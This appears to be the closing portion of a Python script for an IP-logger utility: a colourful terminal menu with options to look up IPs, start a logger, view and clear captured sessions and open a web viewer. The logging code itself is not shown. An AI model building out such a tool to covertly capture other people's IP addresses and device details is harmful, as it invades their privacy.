        os.system('cls' if os.name == 'nt' else 'clear')
        print(MAGENTA + RISHI_BANNER + RESET)
        print(f"\n{CYAN}{'='*50}")
        print(f"  {MAGENTA}MAIN MENU")
        print(f"{CYAN}{'='*50}{RESET}")
        print(f"  {GREEN}[1]{WHITE}  My IP Information{RESET}")
        print(f"  {GREEN}[2]{WHITE}  Lookup IP Address{RESET}")
        print(f"  {GREEN}[3]{WHITE}  Start IP Logger{RESET}")
        print(f"  {GREEN}[4]{WHITE}  View Sessions{RESET}")
        print(f"  {GREEN}[5]{WHITE}  Open Web Viewer{RESET}")
        print(f"  {RED}[6]{WHITE}  Clear All Sessions{RESET}")
        print(f"  {BLUE}[7]{WHITE}  About{RESET}")
        print(f"  {RED}[0]{WHITE}  Exit{RESET}")
        print(f"{CYAN}{'='*50}{RESET}")

        try:
            choice = input(f"\n{YELLOW}  Enter choice: {RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{GREEN}  Goodbye!{RESET}\n")
            sys.exit(0)

        if choice == "1":
            print(f"\n{WHITE}  Fetching your IP...{RESET}")
            ip = get_my_ip()
            if not ip:
                print(f"{RED}  Could not fetch IP{RESET}")
            else:
                print(f"{GREEN}  Your IP: {YELLOW}{ip}{RESET}")
                show_ip_info(ip)
            input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
        elif choice == "2":
            ip = input(f"\n{CYAN}  Enter IP (or 'b' to go back): {RESET}").strip()
            if ip.lower() == "b":
                continue
            if not ip:
                print(f"{RED}  IP required{RESET}")
                input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
                continue
            show_ip_info(ip)
            input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
        elif choice == "3":
            start_logger()
        elif choice == "4":
            show_logs()
            input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
        elif choice == "5":
            open_viewer()
        elif choice == "6":
            clear_logs()
            input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
        elif choice == "7":
            print(f"\n{CYAN}{'='*50}")
            print(f"  {MAGENTA}ABOUT")
            print(f"{CYAN}{'='*50}{RESET}")
            print(f"  {WHITE}Developer : {MAGENTA}RISHI{RESET}")
            print(f"  {WHITE}Version   : {GREEN}14.0{RESET}")
            print(f"  {WHITE}Features  : {GREEN}Simple Device Info{RESET}")
            print(f"{CYAN}{'='*50}{RESET}")
            input(f"\n{YELLOW}  Press Enter to go back...{RESET}")
        elif choice == "0":
            print(f"\n{GREEN}  Goodbye! Stay Ethical!{RESET}\n")
            sys.exit(0)
        else:
            print(f"{RED}  Invalid choice!{RESET}")
            time.sleep(1)

# ================= MAIN =================
if __name__ == "__main__":
    init_db()
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}  Interrupted by user{RESET}")
        print(f"{GREEN}  Goodbye!{RESET}\n")
        sys.exit(0)
